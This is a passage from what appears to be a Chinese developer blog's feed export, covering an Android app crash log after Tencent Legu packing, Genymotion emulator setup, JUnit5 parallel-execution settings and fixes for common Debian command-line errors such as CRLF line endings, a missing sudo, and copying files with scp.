android.content.res.Resources$NotFoundException: Resource ID #0xffffffff</span><br><span class="line">        at android.content.res.ResourcesImpl.getValueForDensity(ResourcesImpl.java:225)</span><br><span class="line">        at android.content.res.Resources.getDrawableForDensity(Resources.java:887)</span><br><span class="line">        at android.content.res.Resources.getDrawable(Resources.java:827)</span><br><span class="line">        at com.android.systemui.shared.recents.model.IconLoader.createNewIconForTask(IconLoader.java:118)</span><br><span class="line">        at com.android.systemui.shared.recents.model.IconLoader.getAndInvalidateIfModified(IconLoader.java:94)</span><br><span class="line">        at com.android.systemui.shared.recents.model.RecentsTaskLoader.getAndUpdateActivityIcon(RecentsTaskLoader.java:325)</span><br><span class="line">        at com.android.systemui.shared.recents.model.RecentsTaskLoadPlan.executePlan(RecentsTaskLoadPlan.java:202)</span><br><span class="line">        at com.android.systemui.shared.recents.model.RecentsTaskLoader.loadTasks(RecentsTaskLoader.java:173)</span><br><span class="line">        at net.oneplus.quickstep.RecentsModel.onTaskStackChangedBackground(RecentsModel.java:275)</span><br><span class="line">        at com.android.systemui.shared.system.TaskStackChangeListeners.onTaskStackChanged(TaskStackChangeListeners.java:80)</span><br><span class="line">        at android.app.ITaskStackListener$Stub.onTransact(ITaskStackListener.java:50)</span><br><span class="line">        at android.os.Binder.execTransact(Binder.java:752)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">         java.util.ConcurrentModificationException</span><br><span class="line">        at java.util.ArrayList$Itr.next(ArrayList.java:860)</span><br><span class="line">        at android.app.ActivityThread.installContentProviders(ActivityThread.java:6106)</span><br><span class="line">        at android.app.ActivityThread.handleBindApplication(ActivityThread.java:6021)</span><br><span class="line">        at android.app.ActivityThread.access$1300(ActivityThread.java:207)</span><br><span class="line">        at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1748)</span><br><span class="line">        at android.os.Handler.dispatchMessage(Handler.java:106)</span><br><span class="line">        at android.os.Looper.loop(Looper.java:193)</span><br><span class="line">        at android.app.ActivityThread.main(ActivityThread.java:6863)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:537)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   --------- beginning of main</span><br><span class="line">2019-05-08 12:02:35.277 366-596&#x2F;system_process W&#x2F;AudioTrack: AUDIO_OUTPUT_FLAG_FAST denied by client; transfer 4, track 48000 Hz, output 44100 Hz</span><br><span class="line">2019-05-08 12:02:35.282 1720-1720&#x2F;? I&#x2F;zygote: Late-enabling -Xcheck:jni</span><br><span class="line">2019-05-08 12:02:35.290 366-378&#x2F;system_process I&#x2F;ActivityManager: Start proc 1720:com.yitieyilu.app&#x2F;u0a71 for activity com.yitieyilu.app&#x2F;.MainActivity</span><br><span class="line">2019-05-08 12:02:35.297 1720-1720&#x2F;? D&#x2F;houdini: [1720] Initialize library(version: 8.0.0_y.49374 RELEASE)... successfully.</span><br><span class="line">2019-05-08 12:02:35.297 1720-1720&#x2F;? W&#x2F;zygote: Unexpected CPU variant for X86 using defaults: x86</span><br><span class="line">2019-05-08 12:02:35.300 1720-1720&#x2F;? I&#x2F;JDWP: type&#x3D;1400 audit(0.0:1007): avc: denied &#123; read write &#125; for path&#x3D;&quot;socket:[31954]&quot; dev&#x3D;&quot;sockfs&quot; ino&#x3D;31954 scontext&#x3D;u:r:untrusted_app:s0:c512,c768 tcontext&#x3D;u:r:init:s0 tclass&#x3D;unix_stream_socket permissive&#x3D;1</span><br><span class="line">2019-05-08 12:02:35.312 1720-1727&#x2F;? E&#x2F;zygote: Failed writing handshake bytes (-1 of 14): Broken pipe</span><br><span class="line">2019-05-08 12:02:35.312 1720-1727&#x2F;? I&#x2F;zygote: Debugger is no longer active</span><br><span class="line">2019-05-08 12:02:35.356 1720-1735&#x2F;? I&#x2F;vndksupport: sphal namespace is not configured for this process. Loading &#x2F;system&#x2F;lib&#x2F;egl&#x2F;libGLES_emulation.so from the current namespace instead.</span><br><span class="line">2019-05-08 12:02:35.360 1720-1720&#x2F;? E&#x2F;zygote: No implementation found for void com.tencent.StubShell.TxAppEntry.fixNativeResource(android.content.res.AssetManager, java.lang.String) (tried Java_com_tencent_StubShell_TxAppEntry_fixNativeResource and Java_com_tencent_StubShell_TxAppEntry_fixNativeResource__Landroid_content_res_AssetManager_2Ljava_lang_String_2)</span><br><span class="line">2019-05-08 12:02:35.370 1720-1735&#x2F;? I&#x2F;vndksupport: sphal namespace is not configured for this process. Loading &#x2F;system&#x2F;lib&#x2F;egl&#x2F;libEGL_emulation.so from the current namespace instead.</span><br><span class="line">2019-05-08 12:02:35.374 1720-1720&#x2F;? E&#x2F;zygote: No implementation found for void com.tencent.StubShell.TxAppEntry.fixUnityResource(android.content.res.AssetManager, java.lang.String) (tried Java_com_tencent_StubShell_TxAppEntry_fixUnityResource and Java_com_tencent_StubShell_TxAppEntry_fixUnityResource__Landroid_content_res_AssetManager_2Ljava_lang_String_2)</span><br><span class="line">2019-05-08 12:02:35.879 1137-1137&#x2F;com.android.launcher3 I&#x2F;Choreographer: Skipped 30 frames!  The application may be doing too much work on its main thread.</span><br><span class="line">2019-05-08 12:02:35.896 1720-1720&#x2F;? I&#x2F;BUGLY_THREAD: type&#x3D;1400 audit(0.0:1014): avc: denied &#123; lock &#125; for path&#x3D;&quot;&#x2F;data&#x2F;data&#x2F;com.yitieyilu.app&#x2F;databases&#x2F;bugly_db_legu&quot; dev&#x3D;&quot;sdb3&quot; ino&#x3D;81969 scontext&#x3D;u:r:untrusted_app:s0:c512,c768 tcontext&#x3D;u:object_r:system_data_file:s0:c512,c768 tclass&#x3D;file permissive&#x3D;1</span><br><span class="line">2019-05-08 12:02:35.902 1720-1735&#x2F;? I&#x2F;vndksupport: sphal namespace is not configured for this process. Loading &#x2F;system&#x2F;lib&#x2F;egl&#x2F;libGLESv1_CM_emulation.so from the current namespace instead.</span><br><span class="line">2019-05-08 12:02:35.904 1720-1720&#x2F;? I&#x2F;m.yitieyilu.app: type&#x3D;1400 audit(0.0:1016): avc: denied &#123; read &#125; for name&#x3D;&quot;databases&quot; dev&#x3D;&quot;sdb3&quot; ino&#x3D;81939 scontext&#x3D;u:r:untrusted_app:s0:c512,c768 tcontext&#x3D;u:object_r:system_data_file:s0:c512,c768 tclass&#x3D;dir permissive&#x3D;1</span><br><span class="line">2019-05-08 12:02:35.904 1720-1720&#x2F;? I&#x2F;m.yitieyilu.app: type&#x3D;1400 audit(0.0:1017): avc: denied &#123; open &#125; for path&#x3D;&quot;&#x2F;data&#x2F;data&#x2F;com.yitieyilu.app&#x2F;databases&quot; dev&#x3D;&quot;sdb3&quot; ino&#x3D;81939 scontext&#x3D;u:r:untrusted_app:s0:c512,c768 tcontext&#x3D;u:object_r:system_data_file:s0:c512,c768 tclass&#x3D;dir permissive&#x3D;1</span><br><span class="line">2019-05-08 12:02:35.919 1720-1735&#x2F;? I&#x2F;vndksupport: sphal namespace is not configured for this process. Loading &#x2F;system&#x2F;lib&#x2F;egl&#x2F;libGLESv2_emulation.so from the current namespace instead.</span><br><span class="line">2019-05-08 12:02:35.965 1720-1720&#x2F;? D&#x2F;houdini: [1720] loaded library &#x2F;data&#x2F;app&#x2F;com.yitieyilu.app-UtOPYAJy5psmCStTkjksGA&#x3D;&#x3D;&#x2F;lib&#x2F;arm&#x2F;libBugly.so via Native Bridge.</span><br><span class="line">2019-05-08 12:02:35.965 1720-1720&#x2F;? I&#x2F;CrashReport: native library loaded</span><br><span class="line">2019-05-08 12:02:35.965 1720-1737&#x2F;? W&#x2F;System.err: java.io.FileNotFoundException: &#x2F;system&#x2F;build.prop (Permission denied)</span><br><span class="line">2019-05-08 12:02:35.966 1720-1720&#x2F;? I&#x2F;CrashReport: backup java method success</span><br><span class="line">2019-05-08 12:02:35.966 1720-1737&#x2F;? W&#x2F;System.err:     at java.io.FileInputStream.open0(Native Method)</span><br><span class="line">2019-05-08 12:02:35.966 1720-1720&#x2F;? I&#x2F;CrashReport: back up java classes success</span><br><span class="line">2019-05-08 12:02:35.967 1720-1737&#x2F;? W&#x2F;System.err:     at java.io.FileInputStream.open(FileInputStream.java:200)</span><br><span class="line">2019-05-08 12:02:35.967 1720-1737&#x2F;? W&#x2F;System.err:     at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:150)</span><br><span class="line">2019-05-08 12:02:35.968 1720-1737&#x2F;? W&#x2F;System.err:     at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:103)</span><br><span class="line">2019-05-08 12:02:35.970 1720-1737&#x2F;? W&#x2F;System.err:     at java.io.FileReader.&lt;init&gt;(FileReader.java:58)</span><br><span class="line">2019-05-08 12:02:35.970 1720-1737&#x2F;? W&#x2F;System.err:     at com.tencent.bugly.legu.proguard.a.p(BUGLY:177)</span><br><span class="line">2019-05-08 12:02:35.970 1720-1737&#x2F;? W&#x2F;System.err:     at com.tencent.bugly.legu.proguard.a.e(BUGLY:226)</span><br><span class="line">2019-05-08 12:02:35.970 1720-1737&#x2F;? W&#x2F;System.err:     at com.tencent.bugly.legu.crashreport.common.info.a.q(BUGLY:330)</span><br><span class="line">2019-05-08 12:02:35.970 1720-1737&#x2F;? W&#x2F;System.err:     at com.tencent.bugly.legu.proguard.a.a(BUGLY:143)</span><br><span class="line">2019-05-08 12:02:35.971 1720-1737&#x2F;? W&#x2F;System.err:     at com.tencent.bugly.legu.crashreport.biz.a.b(BUGLY:232)</span><br><span class="line">2019-05-08 12:02:35.971 1720-1737&#x2F;? W&#x2F;System.err:     at com.tencent.bugly.legu.crashreport.biz.a$a.run(BUGLY:135)</span><br><span class="line">2019-05-08 12:02:35.971 1720-1737&#x2F;? W&#x2F;System.err:     at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:457)</span><br><span class="line">2019-05-08 12:02:35.971 1720-1737&#x2F;? W&#x2F;System.err:     at java.util.concurrent.FutureTask.run(FutureTask.java:266)</span><br><span class="line">2019-05-08 12:02:35.972 1720-1737&#x2F;? W&#x2F;System.err:     at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:301)</span><br><span class="line">2019-05-08 12:02:35.973 1720-1737&#x2F;? W&#x2F;System.err:     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)</span><br><span class="line">2019-05-08 12:02:35.973 1720-1737&#x2F;? W&#x2F;System.err:     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)</span><br><span class="line">2019-05-08 12:02:35.973 1720-1737&#x2F;? W&#x2F;System.err:     at java.lang.Thread.run(Thread.java:764)</span><br><span class="line">2019-05-08 12:02:35.992 1720-1720&#x2F;? I&#x2F;CrashReport: base &#x3D; 0xd3ec4000</span><br><span class="line">2019-05-08 12:02:35.992 1720-1720&#x2F;? I&#x2F;CrashReport: stacksize &#x3D; 4M</span><br><span class="line">2019-05-08 12:02:35.993 1720-1720&#x2F;? I&#x2F;CrashReport: guardsize &#x3D; 4096</span><br><span class="line">2019-05-08 12:02:35.996 1720-1720&#x2F;? I&#x2F;CrashReport: getted buglyline com&#x2F;tencent&#x2F;bugly&#x2F;legu&#x2F;</span><br><span class="line">2019-05-08 12:02:36.004 1720-1720&#x2F;? I&#x2F;CrashReport: it is a channel prefix com&#x2F;tencent&#x2F;bugly&#x2F;legu&#x2F;</span><br><span class="line">2019-05-08 12:02:36.004 1720-1720&#x2F;? I&#x2F;CrashReport: register native log methods success</span><br><span class="line">2019-05-08 12:02:36.005 1720-1720&#x2F;? I&#x2F;CrashReport: register native key-value methods success</span><br><span class="line">2019-05-08 12:02:36.005 1720-1720&#x2F;? I&#x2F;CrashReport: register native methods success</span><br><span class="line">2019-05-08 12:02:36.005 1720-1720&#x2F;? I&#x2F;CrashReport: setLogMode 6 current 4</span><br><span class="line">2019-05-08 12:02:36.028 1720-1720&#x2F;? D&#x2F;AndroidRuntime: Shutting down VM</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    --------- beginning of crash</span><br><span class="line">2019-05-08 12:02:36.030 1720-1720&#x2F;? E&#x2F;AndroidRuntime: FATAL EXCEPTION: main</span><br><span class="line">    Process: com.yitieyilu.app, PID: 1720</span><br><span class="line">    java.lang.UnsatisfiedLinkError: dlopen failed: &quot;&#x2F;data&#x2F;app&#x2F;com.yitieyilu.app-UtOPYAJy5psmCStTkjksGA&#x3D;&#x3D;&#x2F;lib&#x2F;arm&#x2F;libshellx-3.0.0.0.so&quot; has unexpected e_machine: 3</span><br><span class="line">        at java.lang.Runtime.loadLibrary0(Runtime.java:1016)</span><br><span class="line">        at java.lang.System.loadLibrary(System.java:1657)</span><br><span class="line">        at com.tencent.StubShell.TxAppEntry.e(Unknown Source:630)</span><br><span class="line">        at com.tencent.StubShell.TxAppEntry.a(Unknown Source:0)</span><br><span class="line">        at com.tencent.StubShell.TxAppEntry.attachBaseContext(Unknown Source:62)</span><br><span class="line">        at android.app.Application.attach(Application.java:189)</span><br><span class="line">        at android.app.Instrumentation.newApplication(Instrumentation.java:1102)</span><br><span class="line">        at android.app.Instrumentation.newApplication(Instrumentation.java:1086)</span><br><span class="line">        at android.app.LoadedApk.makeApplication(LoadedApk.java:965)</span><br><span class="line">        at android.app.ActivityThread.handleBindApplication(ActivityThread.java:5765)</span><br><span class="line">        at android.app.ActivityThread.-wrap1(Unknown Source:0)</span><br><span class="line">        at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1661)</span><br><span class="line">        at android.os.Handler.dispatchMessage(Handler.java:105)</span><br><span class="line">        at android.os.Looper.loop(Looper.java:164)</span><br><span class="line">        at android.app.ActivityThread.main(ActivityThread.java:6541)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">        at com.android.internal.os.Zygote$MethodAndArgsCaller.run(Zygote.java:240)</span><br><span class="line">        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:767)</span><br><span class="line">2019-05-08 12:02:36.119 1008-1511&#x2F;com.android.dialer I&#x2F;Dialer: VvmTaskExecutor - executing task com.android.voicemail.impl.ActivationTask@fcbbb3a</span><br><span class="line">2019-05-08 12:02:36.120 1008-1511&#x2F;com.android.dialer I&#x2F;Dialer: PreOMigrationHandler - ComponentInfo&#123;com.android.phone&#x2F;com.android.services.telephony.TelephonyConnectionService&#125;, [e2f7d48dd2b5ca523e7313cf4ba0f6ea830b6281], UserHandle&#123;0&#125; already migrated</span><br><span class="line">2019-05-08 12:02:36.128 1273-1273&#x2F;android.process.acore I&#x2F;Binder:1273_2: type&#x3D;1400 audit(0.0:1018): avc: denied &#123; lock &#125; for path&#x3D;&quot;&#x2F;data&#x2F;data&#x2F;com.android.providers.contacts&#x2F;databases&#x2F;calllog.db&quot; dev&#x3D;&quot;sdb3&quot; ino&#x3D;81864 scontext&#x3D;u:r:priv_app:s0:c512,c768 tcontext&#x3D;u:object_r:system_data_file:s0:c512,c768 tclass&#x3D;file permissive&#x3D;1</span><br><span class="line">2019-05-08 12:02:36.139 1008-1511&#x2F;com.android.dialer I&#x2F;Dialer: VvmActivationTask - VVM content provider configured - vvm_type_cvvm</span><br><span class="line">2019-05-08 12:02:36.139 1008-1511&#x2F;com.android.dialer I&#x2F;Dialer: OmtpVvmCarrierCfgHlpr - OmtpEvent:CONFIG_ACTIVATING</span><br><span class="line">2019-05-08 12:02:36.153 1008-1511&#x2F;com.android.dialer I&#x2F;Dialer: TelephonyMangerCompat.setVisualVoicemailSmsFilterSettings - using TelephonyManager</span><br><span class="line">2019-05-08 12:02:36.158 1008-1511&#x2F;com.android.dialer I&#x2F;Dialer: TelephonyMangerCompat.sendVisualVoicemailSms - using TelephonyManager</span><br><span class="line">2019-05-08 12:02:36.172 688-688&#x2F;com.android.phone I&#x2F;Binder:688_2: type&#x3D;1400 audit(0.0:1023): avc: denied &#123; lock &#125; for path&#x3D;&quot;&#x2F;data&#x2F;user_de&#x2F;0&#x2F;com.android.providers.telephony&#x2F;databases&#x2F;telephony.db&quot; dev&#x3D;&quot;sdb3&quot; ino&#x3D;81799 scontext&#x3D;u:r:radio:s0 tcontext&#x3D;u:object_r:system_data_file:s0 tclass&#x3D;file permissive&#x3D;1</span><br><span class="line">2019-05-08 12:02:36.176 438-438&#x2F;? I&#x2F;rild: type&#x3D;1400 audit(0.0:1024): avc: denied &#123; sendto &#125; for path&#x3D;&quot;&#x2F;dev&#x2F;socket&#x2F;logdw&quot; scontext&#x3D;u:r:rild:s0 tcontext&#x3D;u:r:init:s0 tclass&#x3D;unix_dgram_socket permissive&#x3D;1</span><br><span class="line">2019-05-08 12:02:36.184 449-488&#x2F;? D&#x2F;baseband-sms: newsms</span><br><span class="line">2019-05-08 12:02:36.184 449-488&#x2F;? D&#x2F;baseband-sms: sender:(N&#x2F;A)</span><br><span class="line">2019-05-08 12:02:36.184 449-488&#x2F;? D&#x2F;baseband-sms: receiver:122</span><br></pre></td></tr></table></figure><p>乐固加固后出现问题： <a href="https://cloud.tencent.com/developer/ask/197885/answer/308416" target="_blank" rel="noopener">https://cloud.tencent.com/developer/ask/197885/answer/308416</a></p><h3 id="cordova-run-android"><a href="#cordova-run-android" class="headerlink" title="cordova run android"></a>cordova run android</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">le: not installed</span><br><span class="line">Could not find an installed version of Gradle either in Android Studio,</span><br><span class="line">or on your system to install the gradle wrapper. Please include gradle </span><br><span class="line">in your path, or install Android Studio</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> https:&#x2F;&#x2F;res.yitieyilu.com&#x2F;upload&#x2F;pano&#x2F;1ba16376e6284cc8af8f41413514242a&#x2F;index.xml&quot;, source: file:&#x2F;&#x2F;&#x2F;android_asset&#x2F;www&#x2F;static&#x2F;js&#x2F;61.bundle.js (1)</span><br><span class="line">2019-05-06 12:29:49.153 4087-4146&#x2F;com.yitieyilu.app E&#x2F;chromium: [ERROR:context_group.cc(137)] ContextResult::kFatalFailure: WebGL1 blacklisted</span><br><span class="line">2019-05-06 12:29:49.160 4087-4146&#x2F;com.yitieyilu.app E&#x2F;chromium: [ERROR:context_group.cc(137)] ContextResult::kFatalFailure: WebGL1 blacklisted</span><br></pre></td></tr></table></figure><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><ol><li>All of Genymotion OVAs</li></ol><p><a href="https://gist.github.com/runo280/e4be3e04c24b463b55ddf012c5cfbdc4" target="_blank" rel="noopener">最全Genymotion镜像下载</a>,</p><h3 id="安装genymotion虚拟机"><a href="#安装genymotion虚拟机" class="headerlink" title="安装genymotion虚拟机"></a>安装genymotion虚拟机</h3><ol><li><p>启动genymotion，点击add，等待下载完成，回到目录：<br>C:\Users\Administrator\AppData\Local\Genymobile\Genymotion\ova，里面是刚刚下载的虚拟机文件。</p></li><li><p>启动genymotion虚拟机即可.</p></li><li><p>genymotion启动后，对应的<code>adb.exe</code>进程也会起来</p></li></ol><h3 id="使用步骤（不适用直接下载ova的方式"><a href="#使用步骤（不适用直接下载ova的方式" class="headerlink" title="使用步骤（不适用直接下载ova的方式)"></a><del>使用步骤（不适用直接下载ova的方式)</del></h3><ol><li>下载上面的地址的ova文件</li><li>仅打开oracle vm virtualBox，暂时不要打开Genymotion客户端。管理—-导入虚拟电脑 ，如下：</li></ol><p><img src="./img/genymotion-install1.png" alt="genymotion1"></p><ol start="3"><li>选择导入下载的.ova镜像—-下一步—–导入。等待其导入成功后关闭即可，不要尝试在virtualBox中打开。打开Genymotion客户端，选中点击Start，就可以使用了。</li></ol><p><img src="./img/genymotion-install2.png" alt="genymotion1"><br><img src="./img/genymotion-install3.png" alt="genymotion1"><br><img src="./img/genymotion-install4.png" alt="genymotion1"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;工作&quot;&gt;&lt;a href=&quot;#工作&quot; class=&quot;headerlink&quot; title=&quot;工作&quot;&gt;&lt;/a&gt;工作&lt;/h2&gt;&lt;h3 id=&quot;Ionic-闲置材料商城&quot;&gt;&lt;a href=&quot;#Ionic-闲置材料商城&quot; class=&quot;headerlink&quot; title=&quot;I</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    <category term="虚拟机" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Junit5测试技巧和问题整理</title>
    <link href="https://seniortesting.club/posts/Dux41bh2np/"/>
    <id>https://seniortesting.club/posts/Dux41bh2np/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="How-to-repeat-the-failed-test-cases"><a href="#How-to-repeat-the-failed-test-cases" class="headerlink" title="How to repeat the failed test cases?"></a>How to repeat the failed test cases?</h2><ul><li><a href="https://www.swtestacademy.com/junit-5-how-to-repeat-failed-test/" target="_blank" rel="noopener">repeat test</a></li><li><a href="https://github.com/artsok/rerunner-jupiter" target="_blank" rel="noopener">return-jupiter</a></li></ul><h2 id="reorder-the-junit-execution-order"><a href="#reorder-the-junit-execution-order" class="headerlink" title="reorder the junit execution order?"></a>reorder the junit execution order?</h2><p><a href="https://blog.csdn.net/jackyrongvip/article/details/89389387" target="_blank" rel="noopener">https://blog.csdn.net/jackyrongvip/article/details/89389387</a></p><h2 id="how-to-configure-junit-concurrent-execution"><a href="#how-to-configure-junit-concurrent-execution" class="headerlink" title="how to configure junit concurrent execution?"></a>how to configure junit concurrent execution?</h2><p>Create a file named <code>junit-platform.properties</code> in the root of the class path that follows the syntax rules for a Java Properties file.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">junit.jupiter.testinstance.lifecycle.<span class="keyword">default</span> = per_method</span><br><span class="line">junit.jupiter.execution.parallel.enabled = <span class="keyword">true</span></span><br><span class="line">junit.jupiter.execution.parallel.mode.<span class="keyword">default</span> = concurrent</span><br><span class="line">junit.jupiter.execution.parallel.mode.classes.<span class="keyword">default</span> = same_thread</span><br><span class="line">junit.jupiter.execution.parallel.config.strategy = dynamic</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>or via JVM system property:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djunit.jupiter.extensions.autodetection.enabled=true</span><br></pre></td></tr></table></figure><h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><ul><li><a href="https://github.com/kolorobot/junit5-samples/tree/master/junit5-basics/src/test/java/pl/codeleak/samples/junit5/basics" target="_blank" rel="noopener">Junit5 examples</a></li><li><a href="https://github.com/JeffreyFalgout/junit5-extensions" target="_blank" rel="noopener">junit5 extension</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;How-to-repeat-the-failed-test-cases&quot;&gt;&lt;a href=&quot;#How-to-repeat-the-failed-test-cases&quot; class=&quot;headerlink&quot; title=&quot;How to repeat the fail</summary>
      
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="接口自动化" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    <category term="junit5系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96/junit5%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="junit5" scheme="https://seniortesting.club/tags/junit5/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="测试技巧" scheme="https://seniortesting.club/tags/%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>Debian Linux命令其环境配置</title>
    <link href="https://seniortesting.club/posts/f7ANQz/"/>
    <id>https://seniortesting.club/posts/f7ANQz/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bin-bash-M-坏的解释器-没有那个文件或目录"><a href="#bin-bash-M-坏的解释器-没有那个文件或目录" class="headerlink" title="/bin/bash^M 坏的解释器 没有那个文件或目录"></a>/bin/bash^M 坏的解释器 没有那个文件或目录</h2><p>执行shell脚本是报错：/bin/bash^M: 坏的解释器: 没有那个文件或目录</p><p>是因为该文件在windows系统上打开过，关闭后其中的空格符号和Linux的不同，导致这个报错，我们可以通过sed命令与正则的配合将文件中的空格符号替换成linux的空格：</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>执行如下命令即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/\r$//&#x27; bootstrap.sh</span><br></pre></td></tr></table></figure><h2 id="bash-sudo-command-not-found"><a href="#bash-sudo-command-not-found" class="headerlink" title="-bash: sudo: command not found"></a>-bash: sudo: command not found</h2><p>在debian系统中可能会报这个错误，执行如下安装<code>sudo</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt install sudo</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> nano /etc/sudoers</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查对应的sudo组是否有所有的权限：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Allow members of group sudo to execute any <span class="built_in">command</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash">sudo   ALL=(ALL:ALL) ALL</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 以上的设置说明sudo已经有所有的权限，这样设置即可。</span></span><br></pre></td></tr></table></figure><h2 id="nano命令查找字符串search"><a href="#nano命令查找字符串search" class="headerlink" title="nano命令查找字符串search"></a>nano命令查找字符串search</h2><p>当你想搜索某特定文字时，只要想成”WhereIs”而不是”Search”，事情就简单了。只要按下<strong>Ctrl+W</strong>，键入你要搜索的字符串，再按Enter就可以了。想再次搜索相同的字符串，可以直接按Alt+W。也就是搜索下一个。</p><p>注意:在nano帮助文档里，Ctrl-键被表示为一个脱字符（^），因此<strong>Ctrl+W</strong>被写成了^W，等等。Alt-键被表示为一个M（从”Meta”而来），因此Alt+W被写成了M-W。</p><h2 id="Sudo-apt-get-error-flAbsPath-on-var-lib-dpkg-status-failed-No-such-file-or-directory"><a href="#Sudo-apt-get-error-flAbsPath-on-var-lib-dpkg-status-failed-No-such-file-or-directory" class="headerlink" title="Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory"></a>Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory</h2><p>执行安装包安装报错： Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo touch &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;status</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br></pre></td></tr></table></figure><h2 id="复制本地文件到服务器"><a href="#复制本地文件到服务器" class="headerlink" title="复制本地文件到服务器"></a>复制本地文件到服务器</h2><p><strong>scp - secure copy (remote file copy program)</strong></p><ol><li>本地Windows下执行文件复制到指定目录<br>the <strong>.</strong> just indicates the current directory path.</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">D:\linux&gt; scp [source file] [username]@[destination server]:.</span><br><span class="line">D:\linux&gt; scp cool_stuff.txt pi@192.168.1.17:.</span><br><span class="line">D:\linux&gt; scp cool_stuff.txt pi@192.168.1.17:&#x2F;this&#x2F;path&#x2F;right&#x2F;here</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>下载远程服务端文件到本地</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp sanjeev@example.com:cool_stuff.txt 